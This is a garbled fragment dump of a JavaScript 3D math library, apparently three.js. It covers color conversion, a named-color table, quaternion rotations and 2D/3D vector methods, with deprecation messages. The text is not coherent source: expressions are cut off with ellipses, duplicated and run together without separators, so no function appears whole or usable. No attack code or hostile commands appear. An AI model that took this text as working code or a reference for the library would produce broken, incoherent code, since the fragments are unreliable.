4;hue = ( ... lta + 4( r - g ... lta + 4( r - g ) / delta( r - g )r - ghue /= 6;hue /= 6hsl.h = hue;hsl.h = huehsl.hhsl.s = saturation;hsl.s = saturationhsl.shsl.l = lightness;hsl.l = lightnesshsl.lreturn hsl;getStyl ... ;\r\n\r\n\t}return  ...  + ')';'rgb('  ... ) + ')''rgb('  ... ) | 0 )'rgb('  ... ) + ','rgb(( ( thi ... ) | 0 )( this.r * 255 ) | 0( this.g * 255 ) | 0( this.b * 255 ) | 0offsetH ... ;\r\n\r\n\t}var hsl ... tHSL();hsl = this.getHSL()this.getHSL()this.getHSLhsl.h += h;hsl.h += hhsl.s += s;hsl.s += shsl.l += l;hsl.l += lthis.se ... sl.l );this.se ... hsl.l )this.setHSLadd: fu ... ;\r\n\r\n\t}this.r += color.r;this.r += color.rthis.g += color.g;this.g += color.gthis.b += color.b;this.b += color.baddColo ... ;\r\n\r\n\t}this.r  ... lor2.r;this.r  ... olor2.rcolor1.r + color2.rcolor1.rcolor2.rthis.g  ... lor2.g;this.g  ... olor2.gcolor1.g + color2.gcolor1.gcolor2.gthis.b  ... lor2.b;this.b  ... olor2.bcolor1.b + color2.bcolor1.bcolor2.baddScal ... ;\r\n\r\n\t}this.r += s;this.r += sthis.g += s;this.g += sthis.b += s;this.b += smultipl ... ;\r\n\r\n\t}this.r *= color.r;this.r *= color.rthis.g *= color.g;this.g *= color.gthis.b *= color.b;this.b *= color.bthis.r *= s;this.r *= sthis.g *= s;this.g *= sthis.b *= s;this.b *= slerp: f ... ;\r\n\r\n\t}this.r  ...  alpha;this.r  ... * alpha( color ... * alpha( color.r - this.r )color.r - this.rthis.g  ...  alpha;this.g  ... * alpha( color.g - this.g )color.g - this.gthis.b  ...  alpha;this.b  ... * alpha( color.b - this.b )color.b - this.bequals: ... ;\r\n\r\n\t}return  ... is.b );( c.r = ... his.b )( c.r = ... his.g )( c.r === this.r )c.r === this.rc.r( c.g === this.g )c.g === this.gc.g( c.b === this.b )c.b === this.bc.bfromArr ... ;\r\n\r\n\t}this.r = array[ 0 ];this.r = array[ 0 ]array[ 0 ]this.g = array[ 1 ];this.g = array[ 1 ]array[ 1 ]this.b = array[ 2 ];this.b = array[ 2 ]array[ 2 ]toArray ... ;\r\n\r\n\t}return  ... is.b ];[ this. ... his.b ]clone:  ... ;\r\n\r\n\t}new THR ... his.b )new THR ... .setRGBTHREE.C ... CD32 };THREE.C ... ACD32 }{ "alic ... ACD32 }"aliceb ... xF0F8FFaliceblue15792383"antiqu ... xFAEBD7antiquewhite16444375"aqua": 0x00FFFFaqua"aquama ... x7FFFD4aquamarine8388564"azure": 0xF0FFFFazure15794175"beige": 0xF5F5DCbeige16119260"bisque": 0xFFE4C4bisque16770244"black": 0x000000black"blanch ... xFFEBCDblanchedalmond16772045"blue": 0x0000FF"bluevi ... x8A2BE2blueviolet9055202"brown": 0xA52A2Abrown10824234"burlyw ... xDEB887burlywood14596231"cadetb ... x5F9EA0cadetblue6266528"chartr ... x7FFF00chartreuse8388352"chocol ... xD2691Echocolate13789470"coral": 0xFF7F50coral16744272"cornfl ... x6495EDcornflowerblue6591981"cornsilk": 0xFFF8DCcornsilk16775388"crimson": 0xDC143Ccrimson14423100"cyan": 0x00FFFF"darkblue": 0x00008Bdarkblue"darkcyan": 0x008B8Bdarkcyan35723"darkgo ... xB8860Bdarkgoldenrod12092939"darkgray": 0xA9A9A9darkgray11119017"darkgr ... x006400darkgreen25600"darkgrey": 0xA9A9A9darkgrey"darkkh ... xBDB76Bdarkkhaki12433259"darkma ... x8B008Bdarkmagenta9109643"darkol ... x556B2Fdarkolivegreen5597999"darkor ... xFF8C00darkorange16747520"darkor ... x9932CCdarkorchid10040012"darkred": 0x8B0000darkred9109504"darksa ... xE9967Adarksalmon15308410"darkse ... x8FBC8Fdarkseagreen9419919"darksl ... x483D8Bdarkslateblue4734347"darksl ... x2F4F4Fdarkslategray3100495darkslategrey"darktu ... x00CED1darkturquoise52945"darkvi ... x9400D3darkviolet9699539"deeppink": 0xFF1493deeppink16716947"deepsk ... x00BFFFdeepskyblue49151"dimgray": 0x696969dimgray6908265"dimgrey": 0x696969dimgrey"dodger ... x1E90FFdodgerblue2003199"firebr ... xB22222firebrick11674146"floral ... xFFFAF0floralwhite16775920"forest ... x228B22forestgreen2263842"fuchsia": 0xFF00FFfuchsia16711935"gainsb ... xDCDCDCgainsboro14474460"ghostw ... xF8F8FFghostwhite16316671"gold": 0xFFD700gold16766720"golden ... xDAA520goldenrod14329120"gray": 0x808080gray8421504"green": 0x00800032768"greeny ... xADFF2Fgreenyellow11403055"grey": 0x808080grey"honeydew": 0xF0FFF0honeydew15794160"hotpink": 0xFF69B4hotpink16738740"indian ... xCD5C5Cindianred13458524"indigo": 0x4B0082indigo4915330"ivory": 0xFFFFF0ivory16777200"khaki": 0xF0E68Ckhaki15787660"lavender": 0xE6E6FAlavender15132410"lavend ... xFFF0F5lavenderblush16773365"lawngr ... x7CFC00lawngreen8190976"lemonc ... xFFFACDlemonchiffon16775885"lightb ... xADD8E6lightblue11393254"lightc ... xF08080lightcoral15761536"lightc ... xE0FFFFlightcyan14745599"lightg ... xFAFAD2"lightg ... yellow"lightgoldenrodyellow16448210"lightg ... xD3D3D3lightgray13882323"lightg ... x90EE90lightgreen9498256lightgrey"lightp ... xFFB6C1lightpink16758465"lights ... xFFA07Alightsalmon16752762"lights ... x20B2AAlightseagreen2142890"lights ... x87CEFAlightskyblue8900346"lights ... x778899lightslategray7833753lightslategrey"lights ... xB0C4DElightsteelblue11584734"lighty ... xFFFFE0lightyellow16777184"lime": 0x00FF00lime"limegr ... x32CD32limegreen3329330"linen": 0xFAF0E6linen16445670"magenta": 0xFF00FFmagenta"maroon": 0x800000maroon8388608"medium ... x66CDAAmediumaquamarine6737322"medium ... x0000CDmediumblue"medium ... xBA55D3mediumorchid12211667"medium ... x9370DBmediumpurple9662683"medium ... x3CB371mediumseagreen3978097"medium ... x7B68EEmediumslateblue8087790"medium ... x00FA9Amediumspringgreen64154"medium ... x48D1CCmediumturquoise4772300"medium ... xC71585mediumvioletred13047173"midnig ... x191970midnightblue1644912"mintcr ... xF5FFFAmintcream16121850"mistyr ... xFFE4E1mistyrose16770273"moccasin": 0xFFE4B5moccasin16770229"navajo ... xFFDEADnavajowhite16768685"navy": 0x000080navy128"oldlace": 0xFDF5E6oldlace16643558"olive": 0x808000olive8421376"olived ... x6B8E23olivedrab7048739"orange": 0xFFA50016753920"orange ... xFF4500orangered16729344"orchid": 0xDA70D6orchid14315734"palego ... xEEE8AApalegoldenrod15657130"palegr ... x98FB98palegreen10025880"paletu ... xAFEEEEpaleturquoise11529966"palevi ... xDB7093palevioletred14381203"papaya ... xFFEFD5papayawhip16773077"peachp ... xFFDAB9peachpuff16767673"peru": 0xCD853Fperu13468991"pink": 0xFFC0CBpink16761035"plum": 0xDDA0DDplum14524637"powder ... xB0E0E6powderblue11591910"purple": 0x800080purple8388736"red": 0xFF000016711680"rosybr ... xBC8F8Frosybrown12357519"royalb ... x4169E1royalblue4286945"saddle ... x8B4513saddlebrown9127187"salmon": 0xFA8072salmon16416882"sandyb ... xF4A460sandybrown16032864"seagreen": 0x2E8B57seagreen3050327"seashell": 0xFFF5EEseashell16774638"sienna": 0xA0522Dsienna10506797"silver": 0xC0C0C0silver12632256"skyblue": 0x87CEEBskyblue8900331"slateb ... x6A5ACDslateblue6970061"slateg ... x708090slategray7372944slategrey"snow": 0xFFFAFAsnow16775930"spring ... x00FF7Fspringgreen65407"steelb ... x4682B4steelblue4620980"tan": 0xD2B48C13808780"teal": 0x008080teal32896"thistle": 0xD8BFD8thistle14204888"tomato": 0xFF6347tomato16737095"turquo ... x40E0D0turquoise4251856"violet": 0xEE82EEviolet15631086"wheat": 0xF5DEB3wheat16113331"white": 0xFFFFFFwhite16777215"whites ... xF5F5F5whitesmoke16119285"yellow": 0xFFFF00yellow16776960"yellow ... x9ACD32yellowgreen10145074THREE.Q ... ;\r\n\r\n};THREE.Q ... 1;\r\n\r\n}THREE.Quaternionfunctio ... 1;\r\n\r\n}{\r\n\r\n\tt ... 1;\r\n\r\n}this._x = x || 0;this._x = x || 0this._xx || 0this._y = y || 0;this._y = y || 0this._yy || 0this._z = z || 0;this._z = z || 0this._zz || 0this._w ...  w : 1;this._w ... ? w : 1this._w( w !== ... ? w : 1( w !== undefined )w !== undefinedTHREE.Q ... }\r\n\r\n};THREE.Q ... \t}\r\n\r\n}THREE.Q ... ototypeconstru ... ternion_x: 0_y: 0_z: 0_w: 0get x ( ... ;\r\n\r\n\t}() {\r\n\r ... ;\r\n\r\n\t}return this._x;set x ( ... ;\r\n\r\n\t}( value ... ;\r\n\r\n\t}this._x = value;this._x = valuethis.on ... back();this.on ... lback()this.on ... allbackget y ( ... ;\r\n\r\n\t}return this._y;set y ( ... ;\r\n\r\n\t}this._y = value;this._y = valueget z ( ... ;\r\n\r\n\t}return this._z;set z ( ... ;\r\n\r\n\t}this._z = value;this._z = valueget w ( ... ;\r\n\r\n\t}return this._w;set w ( ... ;\r\n\r\n\t}this._w = value;this._w = valuethis._x = x;this._x = xthis._y = y;this._y = ythis._z = z;this._z = zthis._w = w;this._w = wthis._x ... ion._x;this._x ... nion._xquaternion._xthis._y ... ion._y;this._y ... nion._yquaternion._ythis._z ... ion._z;this._z ... nion._zquaternion._zthis._w ... ion._w;this._w ... nion._wquaternion._wsetFrom ... ;\r\n\r\n\t}if ( eu ... );\r\n\t\t}euler i ... = falseeuler i ... E.EulerTHREE.Euler{\r\n\r\n\t\t ... );\r\n\t\t}throw n ... de.' );new Err ... ode.' )'ERROR: ...  code.'ERROR: Quaternion's .setFromEuler() now expects a Euler rotation rather than a Vector3 and order.  Please update your code.ERROR: Quaternion's () now expects a Euler rotation rather than a Vector3 and order  Please update your codevar c1  ...  / 2 );c1 = Ma ... x / 2 )Math.co ... x / 2 )euler._x / 2euler._xvar c2  ...  / 2 );c2 = Ma ... y / 2 )Math.co ... y / 2 )euler._y / 2euler._yvar c3  ...  / 2 );c3 = Ma ... z / 2 )Math.co ... z / 2 )euler._z / 2euler._zvar s1  ...  / 2 );s1 = Ma ... x / 2 )Math.si ... x / 2 )var s2  ...  / 2 );s2 = Ma ... y / 2 )Math.si ... y / 2 )var s3  ...  / 2 );s3 = Ma ... z / 2 )Math.si ... z / 2 )if ( eu ... \r\n\r\n\t\t}euler.o ... = 'XYZ'euler.orderXYZthis._x ... 2 * s3;this._x ... s2 * s3s1 * c2 ... s2 * s3s1 * c2 * c3s1 * c2c1 * s2 * s3c1 * s2this._y ... 2 * s3;this._y ... c2 * s3c1 * s2 ... c2 * s3c1 * s2 * c3s1 * c2 * s3this._z ... 2 * c3;this._z ... s2 * c3c1 * c2 ... s2 * c3c1 * c2 * s3c1 * c2s1 * s2 * c3s1 * s2this._w ... 2 * s3;this._w ... s2 * s3c1 * c2 ... s2 * s3c1 * c2 * c3s1 * s2 * s3euler.o ... = 'YXZ'YXZeuler.o ... = 'ZXY'ZXYeuler.o ... = 'ZYX'ZYXeuler.o ... = 'YZX'YZXeuler.o ... = 'XZY'XZYif ( up ... back();update !== falsevar hal ... ngle );halfAng ... gle / 2angle / 2s = Mat ... Angle )Math.si ... Angle )this._x ... .x * s;this._x = axis.x * saxis.x * saxis.xthis._y ... .y * s;this._y = axis.y * saxis.y * saxis.ythis._z ... .z * s;this._z = axis.z * saxis.z * saxis.zthis._w ... ngle );this._w ... Angle )Math.co ... Angle )setFrom ... nMatrixvar te  ... \r\n\t\t\ts;te = m.elementsm.elementsm11 = te[0]m12 = te[4]m13 = te[8]te[8]m21 = te[1]m22 = te[5]m23 = te[9]te[9]m31 = te[2]m32 = te[6]m33 = te[10]te[10]trace = ... 2 + m33m11 + m22 + m33m11 + m22if ( tr ... \r\n\r\n\t\t}trace > 0s = 0.5 ...  1.0 );s = 0.5 ... + 1.0 )0.5 / M ... + 1.0 )Math.sq ... + 1.0 )trace + 1.0this._w = 0.25 / s;this._w = 0.25 / s0.25 / sthis._x ...  ) * s;this._x ... 3 ) * s( m32 - m23 ) * s( m32 - m23 )m32 - m23this._y ...  ) * s;this._y ... 1 ) * s( m13 - m31 ) * s( m13 - m31 )m13 - m31this._z ...  ) * s;this._z ... 2 ) * s( m21 - m12 ) * s( m21 - m12 )m21 - m12if ( m1 ... \r\n\r\n\t\t}m11 > m ... 1 > m33m11 > m22m11 > m33s = 2.0 ...  m33 );s = 2.0 ... - m33 )2.0 * M ... - m33 )Math.sq ... - m33 )1.0 + m ... 2 - m331.0 + m11 - m221.0 + m11this._w ...  ) / s;this._w ... 3 ) / s(m32 - m23 ) / s(m32 - m23 )this._x = 0.25 * s;this._x = 0.25 * s0.25 * sthis._y ...  ) / s;this._y ... 1 ) / s(m12 + m21 ) / s(m12 + m21 )m12 + m21this._z ...  ) / s;this._z ... 1 ) / s(m13 + m31 ) / s(m13 + m31 )m13 + m31if ( m2 ... \r\n\r\n\t\t}m22 > m331.0 + m ... 1 - m331.0 + m22 - m111.0 + m22this._w ... 1 ) / s(m13 - m31 ) / s(m13 - m31 )this._x ...  ) / s;this._x ... 1 ) / sthis._y = 0.25 * s;this._y = 0.25 * sthis._z ... 2 ) / s(m23 + m32 ) / s(m23 + m32 )m23 + m32s = 2.0 ...  m22 );s = 2.0 ... - m22 )2.0 * M ... - m22 )Math.sq ... - m22 )1.0 + m ... 1 - m221.0 + m33 - m111.0 + m33this._w ... 2 ) / s( m21 - m12 ) / s( m13 + m31 ) / s( m13 + m31 )this._y ... 2 ) / s( m23 + m32 ) / s( m23 + m32 )this._z = 0.25 * s;this._z = 0.25 * ssetFrom ... \n\r\n\t}()functio ... \n\r\n\t}()var v1, r;return  ... \r\n\r\n\t\t}if ( v1 ... tor3();v1 === undefinedv1 = ne ... tor3();v1 = ne ... ctor3()r = vFr ...  ) + 1;r = vFr ... o ) + 1vFrom.dot( vTo ) + 1vFrom.dot( vTo )vFrom.dotif ( r  ... \n\r\n\t\t\t}r < EPSr = 0;r = 0if ( Ma ... \r\n\t\t\t\t}Math.ab ... rom.z )Math.abs( vFrom.x )vFrom.xMath.abs( vFrom.z )vFrom.zv1.set( ... x, 0 );v1.set( ... .x, 0 )v1.set- vFrom.yvFrom.yv1.set( ... om.y );v1.set( ... rom.y )- vFrom.zv1.cros ...  vTo );v1.cros ... , vTo )v1.crossVectorsthis._x = v1.x;this._x = v1.xv1.xthis._y = v1.y;this._y = v1.yv1.ythis._z = v1.z;this._z = v1.zv1.zthis._w = r;this._w = rthis.normalize();this.normalize()this.normalizeinverse ... ;\r\n\r\n\t}this.co ... lize();this.co ... alize()this.co ... rmalizethis.conjugate()this.conjugateconjuga ... ;\r\n\r\n\t}this._x *= -1;this._x *= -1this._y *= -1;this._y *= -1this._z *= -1;this._z *= -1lengthS ... ;\r\n\r\n\t}return  ... his._w;this._x ... this._wthis._x ... this._zthis._x ... this._ythis._x * this._xthis._y * this._ythis._z * this._zthis._w * this._wlength: ... ;\r\n\r\n\t}return  ... s._w );Math.sq ... is._w )normali ... ;\r\n\r\n\t}var l = ... ngth();l = this.length()this.length()this.lengthif ( l  ... \r\n\r\n\t\t}l === 0this._x = 0;this._x = 0this._y = 0;this._y = 0this._z = 0;this._z = 0this._w = 1;this._w = 1l = 1 / l;l = 1 / l1 / lthis._x ... _x * l;this._x ... ._x * lthis._x * lthis._y ... _y * l;this._y ... ._y * lthis._y * lthis._z ... _z * l;this._z ... ._z * lthis._z * lthis._w ... _w * l;this._w ... ._w * lthis._w * lif ( p  ... \r\n\r\n\t\t}p !== undefinedconsole ... ad.' );console ... ead.' )'DEPREC ... stead.'DEPRECATED: Quaternion's .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead.DEPRECATED: Quaternion's  now only accepts one argument Use ( a, b ) a, b  insteadreturn  ... q, p );this.mu ...  q, p )this.mu ... ernionsreturn  ... s, q );this.mu ... is, q )var qax ... = a._w;qax = a._xa._xqay = a._ya._yqaz = a._za._zqaw = a._wa._wvar qbx ... = b._w;qbx = b._xb._xqby = b._yb._yqbz = b._zb._zqbw = b._wb._wthis._x ...  * qby;this._x ... z * qbyqax * q ... z * qbyqax * q ... y * qbzqax * q ... w * qbxqax * qbwqaw * qbxqay * qbzqaz * qbythis._y ...  * qbz;this._y ... x * qbzqay * q ... x * qbzqay * q ... z * qbxqay * q ... w * qbyqay * qbwqaw * qbyqaz * qbxqax * qbzthis._z ...  * qbx;this._z ... y * qbxqaz * q ... y * qbxqaz * q ... x * qbyqaz * q ... w * qbzqaz * qbwqaw * qbzqax * qbyqay * qbxthis._w ...  * qbz;this._w ... z * qbzqaw * q ... z * qbzqaw * q ... y * qbyqaw * q ... x * qbxqaw * qbwqax * qbxqay * qbyqaz * qbzDEPRECATED: Quaternion's .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead. has been removed Use is now vector( quaternion ) quaternion return  ... this );vector. ...  this )vector. ... ternionslerp:  ... ;\r\n\r\n\t}var x = ... his._w;x = this._xy = this._yz = this._zw = this._wvar cos ...  qb._z;cosHalf ... * qb._zw * qb. ... * qb._zw * qb. ... * qb._yw * qb. ... * qb._xw * qb._wqb._wx * qb._xqb._xy * qb._yqb._yz * qb._zqb._zif ( co ... \r\n\r\n\t\t}cosHalfTheta < 0this._w = -qb._w;this._w = -qb._w-qb._wthis._x = -qb._x;this._x = -qb._x-qb._xthis._y = -qb._y;this._y = -qb._y-qb._ythis._z = -qb._z;this._z = -qb._z-qb._zcosHalf ... fTheta;cosHalf ... lfTheta-cosHalfThetathis.copy( qb );this.copy( qb )cosHalfTheta >= 1.0var hal ... heta );halfThe ... Theta )Math.ac ... Theta )var sin ... heta );sinHalf ... Theta )Math.sq ... Theta )1.0 - c ... lfThetaif ( Ma ... \r\n\r\n\t\t}Math.ab ... < 0.001Math.ab ... Theta )this._w ... s._w );this._w ... is._w )0.5 * ( ... is._w )( w + this._w )w + this._wthis._x ... s._x );this._x ... is._x )0.5 * ( ... is._x )( x + this._x )x + this._xthis._y ... s._y );this._y ... is._y )0.5 * ( ... is._y )( y + this._y )y + this._ythis._z ... s._z );this._z ... is._z )0.5 * ( ... is._z )( z + this._z )z + this._zvar rat ... fTheta;ratioA  ... lfThetaMath.si ... lfThetaMath.si ... Theta )( 1 - t ... lfTheta( 1 - t )1 - tratioB  ... lfThetat * halfThetathis._w ... tioB );this._w ... atioB )( w * r ... atioB )w * rat ...  ratioBw * ratioAthis._w * ratioBthis._x ... tioB );this._x ... atioB )( x * r ... atioB )x * rat ...  ratioBx * ratioAthis._x * ratioBthis._y ... tioB );this._y ... atioB )( y * r ... atioB )y * rat ...  ratioBy * ratioAthis._y * ratioBthis._z ... tioB );this._z ... atioB )( z * r ... atioB )z * rat ...  ratioBz * ratioAthis._z * ratioB( quate ... is._w )( quate ... is._z )( quate ... is._y )( quate ... is._x )quatern ... this._xquatern ... this._yquatern ... this._zquatern ... this._wthis._x ... y[ 0 ];this._x = array[ 0 ]this._y ... y[ 1 ];this._y = array[ 1 ]this._z ... y[ 2 ];this._z = array[ 2 ]this._w ... y[ 3 ];this._w = array[ 3 ]array[ 3 ]return  ... s._w ];[ this. ... is._w ]onChang ... ;\r\n\r\n\t}this.on ... llback;onChang ... n () {}new THR ... is._w )THREE.Q ... );\r\n\r\n}THREE.Q ... n.slerp{\r\n\r\n\tr ... );\r\n\r\n}return  ... b, t );qm.copy ... qb, t )qm.copy( qa ).slerpqm.copy( qa )qm.copyTHREE.V ... ;\r\n\r\n};THREE.V ... 0;\r\n\r\n}functio ... 0;\r\n\r\n}{\r\n\r\n\tt ... 0;\r\n\r\n}this.x = x || 0;this.x = x || 0this.xthis.y = y || 0;this.y = y || 0this.yTHREE.V ... }\r\n\r\n};THREE.V ... \t}\r\n\r\n}THREE.V ... ototypeconstru ... Vector2this.x = x;this.x = xthis.y = y;this.y = ysetX: f ... ;\r\n\r\n\t}setY: f ... ;\r\n\r\n\t}setComp ... }\r\n\r\n\t}switch  ... \r\n\r\n\t\t}case 0: ...  break;this.x = value;this.x = valuethis.y = value;this.y = valuedefault ... ndex );throw n ... ndex );new Err ... index )"index  ... + index"index  ... ange: "index is out of range: getComp ... }\r\n\r\n\t}case 0: ... this.x;return this.x;case 1: ... this.y;return this.y;this.x = v.x;this.x = v.xv.xthis.y = v.y;this.y = v.yv.yif ( w  ... \r\n\r\n\t\t}DEPRECATED: Vector2's .add() now only accepts one argument. Use .addVectors( a, b ) instead.DEPRECATED: Vector2's return  ... v, w );this.ad ...  v, w )this.addVectorsthis.x += v.x;this.x += v.xthis.y += v.y;this.y += v.yaddVect ... ;\r\n\r\n\t}this.x = a.x + b.x;this.x = a.x + b.xa.x + b.xa.xb.xthis.y = a.y + b.y;this.y = a.y + b.ya.y + b.ya.yb.ythis.x += s;this.x += sthis.y += s;this.y += ssub: fu ... ;\r\n\r\n\t}DEPRECATED: Vector2's .sub() now only accepts one argument. Use .subVectors( a, b ) instead.this.su ...  v, w )this.subVectorsthis.x -= v.x;this.x -= v.xthis.y -= v.y;this.y -= v.ysubVect ... ;\r\n\r\n\t}this.x = a.x - b.x;this.x = a.x - b.xa.x - b.xthis.y = a.y - b.y;this.y = a.y - b.ya.y - b.ythis.x *= v.x;this.x *= v.xthis.y *= v.y;this.y *= v.ythis.x *= s;this.x *= sthis.y *= s;this.y *= sdivide: ... ;\r\n\r\n\t}this.x /= v.x;this.x /= v.xthis.y /= v.y;this.y /= v.ydivideS ... ;\r\n\r\n\t}if ( sc ... \r\n\r\n\t\t}scalar !== 0var inv ... scalar;invScal ...  scalar1 / scalarthis.x *= invScalar;this.x *= invScalarthis.y *= invScalar;this.y *= invScalarthis.x = 0;this.x = 0this.y = 0;this.y = 0min: fu ... ;\r\n\r\n\t}this.x > v.xthis.y > v.ymax: fu ... ;\r\n\r\n\t}this.x < v.xthis.y < v.yclamp:  ... is;\r\n\t}functio ... is;\r\n\t}{\r\n\r\n\t\t ... is;\r\n\t}this.x < min.xmin.xthis.x = min.x;this.x = min.xthis.x > max.xmax.xthis.x = max.x;this.x = max.xthis.y < min.ymin.ythis.y = min.y;this.y = min.ythis.y > max.ymax.ythis.y = max.y;this.y = max.yclampSc ... \n\t} )()( funct ... \n\t} )()( funct ... \t\r\n\t} )functio ... \n\t\t\r\n\t}{\r\n\r\n\t\t ... \n\t\t\r\n\t}var min, max;return  ... \n\r\n\t\t};if ( mi ... \n\r\n\t\t\t}min === undefinedmin = n ... tor2();min = n ... ctor2()max = n ... tor2();max = n ... ctor2()min.set ... nVal );min.set ... inVal )min.setmax.set ... xVal );max.set ... axVal )max.setreturn  ...  max );this.cl ... , max )this.clampfloor:  ... ;\r\n\r\n\t}this.x  ... is.x );this.x  ... his.x )Math.floor( this.x )this.y  ... is.y );this.y  ... his.y )Math.floor( this.y )ceil: f ... ;\r\n\r\n\t}Math.ceil( this.x )Math.ceil( this.y )round:  ... ;\r\n\r\n\t}Math.round( this.x )Math.round( this.y )roundTo ... ;\r\n\r\n\t}( this. ... his.x )( this.x < 0 )this.x < 0( this. ... his.y )( this.y < 0 )this.y < 0negate: ... ;\r\n\r\n\t}return  ...  - 1 );this.mu ... ( - 1 )this.multiplyScalar- 1dot: fu ... ;\r\n\r\n\t}return  ...  * v.y;this.x  ... y * v.ythis.x * v.xthis.y * v.yreturn  ... this.y;this.x  ...  this.ythis.x * this.xthis.y * this.yreturn  ... is.y );Math.sq ... his.y )return  ... th() );this.di ... gth() )this.divideScalardistanc ... ;\r\n\r\n\t}return  ...  v ) );Math.sq ... ( v ) )this.di ... ed( v )this.di ... Squaredvar dx  ...  - v.y;dx = this.x - v.xthis.x - v.xdy = this.y - v.ythis.y - v.yreturn  ... y * dy;setLeng ... ;\r\n\r\n\t}var old ... ngth();oldLeng ... ength()if ( ol ... );\r\n\t\t}oldLeng ... dLengtholdLength !== 0l !== oldLengththis.mu ... ngth );this.mu ... ength )l / oldLengththis.x  ...  alpha;this.x  ... * alpha( v.x - ... * alpha( v.x - this.x )v.x - this.xthis.y  ...  alpha;this.y  ... * alpha( v.y - ... * alpha( v.y - this.y )v.y - this.yreturn  ... .y ) );( ( v.x ... s.y ) )( v.x = ... his.y )( v.x === this.x )v.x === this.x( v.y === this.y )v.y === this.ythis.x = array[ 0 ];this.x = array[ 0 ]this.y = array[ 1 ];this.y = array[ 1 ]return  ... is.y ];[ this.x, this.y ]new THR ... his.y )this.z = z || 0;this.z = z || 0this.zconstru ... Vector3this.z = z;this.z = zsetZ: f ... ;\r\n\r\n\t}this.z = value;this.z = valuecase 2: ... this.z;return this.z;this.z = v.z;this.z = v.zv.zDEPRECATED: Vector3's .add() now only accepts one argument. Use .addVectors( a, b ) instead.DEPRECATED: Vector3's this.z += v.z;this.z += v.zthis.z += s;this.z += sthis.z = a.z + b.z;this.z = a.z + b.za.z + b.za.zb.zDEPRECATED: Vector3's .sub() now only accepts one argument. Use .subVectors( a, b ) instead.this.z -= v.z;this.z -= v.zthis.z = a.z - b.z;this.z = a.z - b.za.z - b.zDEPRECATED: Vector3's .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead.this.mu ...  v, w )this.multiplyVectorsthis.z *= v.z;this.z *= v.zthis.x *= scalar;this.x *= scalarthis.y *= scalar;this.y *= scalarthis.z *= scalar;this.z *= scalarthis.x = a.x * b.x;this.x = a.x * b.xa.x * b.xthis.y = a.y * b.y;this.y = a.y * b.ya.y * b.ythis.z = a.z * b.z;this.z = a.z * b.za.z * b.zapplyEu ... \n\r\n\t}()var quaternion;if ( eu ... \n\r\n\t\t\t}console ... de.' );console ... ode.' )ERROR: Vector3's .applyEuler() now expects a Euler rotation rather than a Vector3 and order.  Please update your code.ERROR: Vector3's if ( qu ... nion();quatern ... definedquatern ... nion();quatern ... rnion()new THR ... rnion()this.ap ... er ) );this.ap ... ler ) )this.applyQuaternionquatern ... euler )quatern ... omEulerapplyAx ... \n\r\n\t}()this.ap ... le ) );this.ap ... gle ) )quatern ... angle )quatern ... isAngleapplyMa ... ;\r\n\r\n\t}var x = this.x;x = this.xvar y = this.y;y = this.yvar z = this.z;z = this.zvar e = m.elements;e = m.elementsthis.x  ... 6] * z;this.x  ... [6] * ze[0] *  ... [6] * ze[0] * x + e[3] * ye[0] * xe[0]e[3] * ye[3]e[6] * ze[6]this.y  ... 7] * z;this.y  ... [7] * ze[1] *  ... [7] * ze[1] * x + e[4] * ye[1] * xe[1]e[4] * ye[4]e[7] * ze[7]this.z  ... 8] * z;this.z  ... [8] * ze[2] *  ... [8] * ze[2] * x + e[5] * ye[2] * xe[2]e[5] * ye[5]e[8] * ze[8]var x = ... this.z;this.x  ...  e[12];this.x  ... + e[12]e[0] *  ... + e[12]e[0] *  ... 8]  * ze[0] * x + e[4] * ye[8]  * ze[12]this.y  ...  e[13];this.y  ... + e[13]e[1] *  ... + e[13]e[1] *  ... 9]  * ze[1] * x + e[5] * ye[9]  * ze[9]e[13]this.z  ...  e[14];this.z  ... + e[14]e[2] *  ... + e[14]e[2] *  ... 10] * ze[2] * x + e[6] * ye[6] * ye[10] * ze[10]e[14]applyPr ... ;\r\n\r\n\t}var d = ... [15] );d = 1 / ... e[15] )1 / ( e ... e[15] )( e[3]  ... e[15] )e[3] *  ... + e[15]e[3] *  ... 11] * ze[3] * x + e[7] * ye[3] * xe[7] * ye[11] * ze[11]e[15]this.x  ...  ) * d;this.x  ... ] ) * d( e[0]  ... ] ) * d( e[0]  ... e[12] )this.y  ...  ) * d;this.y  ... ] ) * d( e[1]  ... ] ) * d( e[1]  ... e[13] )this.z  ...  ) * d;this.z  ... ] ) * d( e[2]  ... ] ) * d( e[2]  ... e[14] )applyQu ... ;\r\n\r\n\t}var qx = q.x;qx = q.xq.xvar qy = q.y;qy = q.yq.yvar qz = q.z;qz = q.zq.zvar qw = q.w;qw = q.wq.wvar ix  ... qz * y;ix =  q ...  qz * yqw * x  ...  qz * yqw * x + qy * zqw * xqy * zqz * yvar iy  ... qx * z;iy =  q ...  qx * zqw * y  ...  qx * zqw * y + qz * xqw * yqz * xqx * zvar iz  ... qy * x;iz =  q ...  qy * xqw * z  ...  qy * xqw * z + qx * yqw * zqx * yqy * xvar iw  ... qz * z;iw = -q ...  qz * z-qx * x ...  qz * z-qx * x - qy * y-qx * x-qxqy * yqz * zthis.x  ...  * -qy;this.x  ... z * -qyix * qw ... z * -qyix * qw ... y * -qzix * qw + iw * -qxix * qwiw * -qxiy * -qz-qziz * -qy-qythis.y  ...  * -qz;this.y  ... x * -qziy * qw ... x * -qziy * qw ... z * -qxiy * qw + iw * -qyiy * qwiw * -qyiz * -qxix * -qzthis.z  ...  * -qx;this.z  ... y * -qxiz * qw ... y * -qxiz * qw ... x * -qyiz * qw + iw * -qziz * qwiw * -qzix * -qyiy * -qxtransfo ... ;\r\n\r\n\t}this.x  ... ]  * z;this.x  ... 8]  * zthis.y  ... ]  * z;this.y  ... 9]  * zthis.z  ... 0] * z;this.z  ... 10] * zthis.z /= v.z;this.z /= v.zthis.z *= invScalar;this.z *= invScalarthis.z = 0;this.z = 0this.z > v.zthis.z < v.zclamp:  ... ;\r\n\r\n\t}this.z < min.zmin.zthis.z = min.z;this.z = min.zthis.z > max.zmax.zthis.z = max.z;this.z = max.z( funct ... \n\r\n\t} )min = n ... tor3();min = n ... ctor3()max = n ... tor3();max = n ... ctor3()this.z  ... is.z );this.z  ... his.z )Math.floor( this.z )Math.ceil( this.z )Math.round( this.z )( this. ... his.z )( this.z < 0 )this.z < 0return  ...  * v.z;this.x  ... z * v.zthis.z * v.zreturn  ... this.z;this.x  ...  this.zthis.z * this.zreturn  ... is.z );Math.sq ... his.z )lengthM ... 